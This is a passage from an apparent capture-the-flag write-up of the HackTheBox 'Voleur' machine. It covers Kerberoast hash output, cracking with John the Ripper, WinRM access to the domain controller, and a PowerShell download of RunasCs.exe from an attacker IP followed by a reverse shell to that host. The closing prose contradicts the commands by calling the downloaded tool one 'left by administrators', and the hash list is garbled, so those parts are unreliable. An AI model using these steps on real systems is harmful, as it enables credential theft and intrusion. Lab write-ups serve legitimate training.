</span></span><span style="display:flex;"><span>$krb5tgs$23$*svc_winrm$VOLEUR.HTB$voleur.htb/svc_winrm*$ba33b773e1d5a82f61955402b1b03c4e$76acd3c2fb0001ffdfdbbddb41ce2175310196cf81c359738b595b27e4b6aeb9a713035cc1d3f4c03d73e4fa41c75e9cdfb60bebfd07e586a1e74df4be7cb685cedad8fd28748b35f2730fd4bc65915938dde8ff8779729d7097d4ee5b8683c476b3fc79d8b84255c656a7a9fc3b9d0ee0c7eba6834d29bc4a88c48d7672df9432feae96268981c6258d51d1764861a57b19997b06e8d47b50f113c68c520c037d6559591ab0a63e18694fc22c9e3df3457d7d3e0b2cd8e285110fb48696cee4802dede3a44cd1be77230f94d2522f4d7abe418b5404a44cd27d6c22235cd30971a2fefbc9f7c2c5e1bb31e1ccfd9a70a5d8cf9db1c5e1981e0c788c5242c0e163a31c93b3f658e25c1a63968d0f1b16b0b67aec3a9fe662a8d67117cc95efc7baf68208312b3e7cf58aacae52db3cddc343737d61a2f93d7166aef05149003ed843b447156f605dff71c1d9d38fc52ff062d588914d2edb1e6daf6d60a2d31f1ed32716a2832f56b9c0422fa657cd551152546c5f57ef35a756f9eb9d9fa1cd4d6d893633f87413db436db87730d3cd18659e26511ef9bff55b90a3449ca170d53fac4d4bf7af2aceead7d3b9a57d68bdd0b8ce17883cba72dc2f995d830f58d08499e4ec79f422e0e35e76bdb73e55fdc386d65cd3aa6d0539e4d3c7aa738209aa8b2fb9fba7f15e4b109a390b7d169a47394ad9258122c0ccd60ff30b9d03a7b9125ddf77743ceddfdcdfd98f88a5a31e0e6ce817784294075c368f4410c88e8b9ea8a8293c138187346f938d853feb490291c7923d7fda729e0b2148e201ff4266ef655d262c81abb24dac81154702dbf2a86b91d1bf0917d66824c16775f6e740951cf27e3f3e2a32ae669e84eedd447c4a3c8795ff835ae5d86d61d8bb16480751ffe869e37af4e06aea6f220de0aae54f775da903a6bd70b022a3a6360d8858de45e4110735d823153daf54a6652c71b1f9e0a1185bf4266d2016719d45de57bcd5d56942774848fbe58a4ca3d08c36c6782de9233aee865dc367439ead0d6d7e969b703151ffe8062055d0df4ae38e648d4c750f2e37f98bf86f4e8f33bb214cc7650c6e140fcaa9d6eb28a4015f404ff6186eae9d5bf0750d5576344e037c541eaad33b990f4c2b89f2a144a8b5953eb46d29760f7d3586e8be1b4d40b1ab44cab60675370a3b1d4000f7ba5c702244577abc63955b6279135578a4b8b319d91b8836efcd56c51cee39efaede7f90f63d0f9df8e340047fae229947ec206ecd606bf595544524261a34d50047c4947b293fb2d040f272b5fc0af01bfed543c95a8d68c1e6333ea485b44e474df491a19653ea7eb8464d73b6fdcbce1107f2cc523fa866107e083e28cddd42f38775308190c625e77fa83a437c0ed9fab68586ab66d37816cb7a7b38532f868be88e8eb5e46241db403de30ed9bb96
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>VERBOSE<span style="color:#f92672">]</span> SPN removed successfully <span style="color:#66d9ef">for</span> <span style="color:#f92672">(</span>svc_winrm<span style="color:#f92672">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>The targeted Kerberoasting attack leveraged the WriteSPN permission to set arbitrary Service Principal Names on target accounts, then requested Kerberos service tickets for these accounts. This technique allows attackers to obtain encrypted ticket-granting service tickets that can be cracked offline to recover plaintext passwords.</p>
<p><strong>Hashes Retrieved:</strong></p>
<ul>
<li>
<p><strong>lacey.miller:</strong> <em>krb</em>5<em>tgs</em>23∗<em>lacey</em>.<em>miller</em>&hellip;</p>
<p>krb5tgs</p>
<p>∗lacey.miller</p>
</li>
<li>
<p><strong>svc_winrm:</strong> <em>krb</em>5<em>tgs</em>23∗<em>svcwinrm</em>&hellip;</p>
<p>krb5tgs</p>
<p>∗svcwinrm</p>
</li>
</ul>
<p>The successful extraction of Kerberos ticket hashes for both lacey.miller and svc_winrm provided offline cracking targets. These Type 23 tickets use RC4 encryption, which is more vulnerable to cracking than newer encryption methods like AES.</p>
<p><strong>3.4 Hash Cracking</strong></p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/home/…/HTB_Challenges/Machines/Season8/Voleur<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─# john --wordlist<span style="color:#f92672">=</span>/home/hexhunter404/Downloads/rockyou.txt svc_winrm_hash.txt --format<span style="color:#f92672">=</span>krb5tgs
</span></span><span style="display:flex;"><span>Using default input encoding: UTF-8
</span></span><span style="display:flex;"><span>Loaded <span style="color:#ae81ff">1</span> password hash <span style="color:#f92672">(</span>krb5tgs, Kerberos <span style="color:#ae81ff">5</span> TGS etype <span style="color:#ae81ff">23</span> <span style="color:#f92672">[</span>MD4 HMAC-MD5 RC4<span style="color:#f92672">])</span>
</span></span><span style="display:flex;"><span>Will run <span style="color:#ae81ff">4</span> OpenMP threads
</span></span><span style="display:flex;"><span>Press <span style="color:#e6db74">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span style="color:#66d9ef">for</span> status
</span></span><span style="display:flex;"><span>AFireInsidedeOzarctica980219afi <span style="color:#f92672">(</span>?<span style="color:#f92672">)</span>     
</span></span><span style="display:flex;"><span>1g 0:00:00:08 DONE <span style="color:#f92672">(</span>2025-07-05 23:48<span style="color:#f92672">)</span> 0.1117g/s 1281Kp/s 1281Kc/s 1281KC/s AHAMDAKMAL..AFIROCKS!
</span></span><span style="display:flex;"><span>Use the <span style="color:#e6db74">&#34;--show&#34;</span> option to display all of the cracked passwords reliably
</span></span><span style="display:flex;"><span>Session completed. 
</span></span></code></pre></td></tr></table>
</div>
</div><p><strong>Password Found:</strong> AFireInsidedeOzarctica980219afi</p>
<p>The recovered password &ldquo;AFireInsidedeOzarctica980219afi&rdquo; appeared to be a combination of song lyrics or band name with additional characters, representing a common pattern where users create passwords they consider complex but are still vulnerable to wordlist attacks.</p>
<p><strong>3.5 WinRM Access</strong></p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/home/hexhunter404<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─# ntpdate voleur.htb <span style="color:#f92672">&amp;&amp;</span> impacket-getTGT voleur.htb/svc_winrm:AFireInsidedeOzarctica980219afi 
</span></span><span style="display:flex;"><span>2025-07-06 06:45:25.382677 <span style="color:#f92672">(</span>+0200<span style="color:#f92672">)</span> +28799.807445 +/- 0.013519 voleur.htb 10.129.196.199 s1 no-leap
</span></span><span style="display:flex;"><span>CLOCK: time stepped by 28799.807445
</span></span><span style="display:flex;"><span>Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Saving ticket in svc_winrm.ccache
</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/home/hexhunter404<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─# ntpdate voleur.htb <span style="color:#f92672">&amp;&amp;</span> evil-winrm -i DC.voleur.htb -r VOLEUR.HTB
</span></span><span style="display:flex;"><span>2025-07-06 06:46:56.688599 <span style="color:#f92672">(</span>+0200<span style="color:#f92672">)</span> +28803.921600 +/- 0.013948 voleur.htb 10.129.196.199 s1 no-leap
</span></span><span style="display:flex;"><span>CLOCK: time stepped by 28803.921600
</span></span><span style="display:flex;"><span>                                        
</span></span><span style="display:flex;"><span>Evil-WinRM shell v3.7
</span></span><span style="display:flex;"><span>                                        
</span></span><span style="display:flex;"><span>Warning: Remote path completions is disabled due to ruby limitation: undefined method <span style="color:#e6db74">`</span>quoting_detection_proc<span style="color:#960050;background-color:#1e0010">&#39;</span> <span style="color:#66d9ef">for</span> module Reline                                                                                                      
</span></span><span style="display:flex;"><span>                                        
</span></span><span style="display:flex;"><span>Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                                                                 
</span></span><span style="display:flex;"><span>                                        
</span></span><span style="display:flex;"><span>Info: Establishing connection to remote endpoint
</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\s</span>vc_winrm<span style="color:#ae81ff">\D</span>ocuments&gt; cd ..
</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\s</span>vc_winrm&gt; cd Desktop
</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\s</span>vc_winrm<span style="color:#ae81ff">\D</span>esktop&gt; dir
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    Directory: C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\s</span>vc_winrm<span style="color:#ae81ff">\D</span>esktop
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Mode                 LastWriteTime         Length Name
</span></span><span style="display:flex;"><span>----                 -------------         ------ ----
</span></span><span style="display:flex;"><span>-a----         1/29/2025   7:07 AM           <span style="color:#ae81ff">2312</span> Microsoft Edge.lnk
</span></span><span style="display:flex;"><span>-ar---          7/5/2025   8:38 PM             <span style="color:#ae81ff">34</span> user.txt
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\s</span>vc_winrm<span style="color:#ae81ff">\D</span>esktop&gt; type user.txt
</span></span><span style="display:flex;"><span>9ead16ec422a36bbec3e8eb539ea2d77
</span></span></code></pre></td></tr></table>
</div>
</div><p>The successful WinRM connection established interactive PowerShell access to the domain controller. WinRM access provides significant capabilities for system administration and reconnaissance, as it allows execution of PowerShell commands with the privileges of the authenticated user.</p>
<p><strong>User Flag Retrieved:</strong> 9ead16ec422a36bbec3e8eb539ea2d77</p>
<hr>
<h2 id="phase-4-dpapi-exploitation"><strong>Phase 4: DPAPI Exploitation</strong><a href="#phase-4-dpapi-exploitation" class="hanchor" ariaLabel="Anchor">#</a> </h2>
<p>I started looking around and found that there is a folder beloging to todd.wolfe in C:\Users but inaccessible with svc_winrm as well as the share C:\IT</p>
<p>I tried to see the deleted users but didn’t have the required privileges with svc_winrm</p>
<p><strong>4.1 Custom Runas Tool</strong></p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">43
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers&gt; dir
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    Directory: C:<span style="color:#ae81ff">\U</span>sers
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Mode                 LastWriteTime         Length Name
</span></span><span style="display:flex;"><span>----                 -------------         ------ ----
</span></span><span style="display:flex;"><span>d-----          6/5/2025   3:30 PM                Administrator
</span></span><span style="display:flex;"><span>d-----         1/29/2025   7:11 AM                jeremy.combs
</span></span><span style="display:flex;"><span>d-r---         1/28/2025  12:35 PM                Public
</span></span><span style="display:flex;"><span>d-----         1/30/2025   3:39 AM                svc_backup
</span></span><span style="display:flex;"><span>d-----         1/29/2025   4:47 AM                svc_ldap
</span></span><span style="display:flex;"><span>d-----         1/29/2025   7:07 AM                svc_winrm
</span></span><span style="display:flex;"><span>d-----         1/29/2025   4:53 AM                todd.wolfe
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers&gt; cd todd.wolfe
</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\t</span>odd.wolfe&gt; dir
</span></span><span style="display:flex;"><span>Access to the path <span style="color:#e6db74">&#39;C:\Users\todd.wolfe&#39;</span> is denied.
</span></span><span style="display:flex;"><span>At line:1 char:1
</span></span><span style="display:flex;"><span>+ dir
</span></span><span style="display:flex;"><span>+ ~~~
</span></span><span style="display:flex;"><span>    + CategoryInfo          : PermissionDenied: <span style="color:#f92672">(</span>C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\t</span>odd.wolfe:String<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Get-ChildItem<span style="color:#f92672">]</span>, UnauthorizedAccessException
</span></span><span style="display:flex;"><span>    + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand
</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\t</span>odd.wolfe&gt; cd ..
</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers&gt; cd svc_backup
</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\s</span>vc_backup&gt; dir
</span></span><span style="display:flex;"><span>Access to the path <span style="color:#e6db74">&#39;C:\Users\svc_backup&#39;</span> is denied.
</span></span><span style="display:flex;"><span>At line:1 char:1
</span></span><span style="display:flex;"><span>+ dir
</span></span><span style="display:flex;"><span>+ ~~~
</span></span><span style="display:flex;"><span>    + CategoryInfo          : PermissionDenied: <span style="color:#f92672">(</span>C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\s</span>vc_backup:String<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Get-ChildItem<span style="color:#f92672">]</span>, UnauthorizedAccessException
</span></span><span style="display:flex;"><span>    + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand
</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\s</span>vc_backup&gt; cd ..
</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers&gt; cd jeremy_combs
</span></span><span style="display:flex;"><span>Cannot find path <span style="color:#e6db74">&#39;C:\Users\jeremy_combs&#39;</span> because it does not exist.
</span></span><span style="display:flex;"><span>At line:1 char:1
</span></span><span style="display:flex;"><span>+ cd jeremy_combs
</span></span><span style="display:flex;"><span>+ ~~~~~~~~~~~~~~~
</span></span><span style="display:flex;"><span>    + CategoryInfo          : ObjectNotFound: <span style="color:#f92672">(</span>C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\j</span>eremy_combs:String<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Set-Location<span style="color:#f92672">]</span>, ItemNotFoundException
</span></span><span style="display:flex;"><span>    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.SetLocationCommand
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\s</span>vc_winrm<span style="color:#ae81ff">\D</span>ocuments&gt; Get-ADObject -IncludeDeletedObjects -Filter <span style="color:#e6db74">&#39;IsDeleted -eq $true -and ObjectClass -eq &#34;user&#34;&#39;</span>
</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\s</span>vc_winrm<span style="color:#ae81ff">\D</span>ocuments&gt; Invoke-WebRequest -Uri <span style="color:#e6db74">&#34;http://10.10.14.173:8081/RunasCs.exe&#34;</span> -OutFile <span style="color:#e6db74">&#34;runas.exe&#34;</span>
</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\s</span>vc_winrm<span style="color:#ae81ff">\D</span>ocuments&gt; runas.exe svc_ldap <span style="color:#e6db74">&#39;M1XyC9pW7qT5Vn&#39;</span> <span style="color:#e6db74">&#34;cmd.exe&#34;</span> -r 10.10.14.173:8084
</span></span></code></pre></td></tr></table>
</div>
</div><p>The discovery of a custom runas executable in the svc_winrm Documents folder suggested administrative tools or scripts left by system administrators. This tool provided the capability to execute commands as the svc_ldap user, effectively allowing impersonation and access to resources that svc_ldap could access.</p>
